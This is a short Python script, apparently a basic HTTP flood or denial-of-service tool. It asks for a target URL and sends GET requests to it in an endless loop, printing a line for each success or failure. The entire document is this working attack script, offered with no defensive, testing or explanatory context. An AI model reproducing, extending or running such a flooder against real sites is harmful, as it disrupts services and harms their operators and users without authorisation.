import requests;

url = input("Enter Target URL: ")

while True:

    try:
        requests.get(url)
        print("[+] Send request to", url)

    except:
        print("[-] Failed to send request")
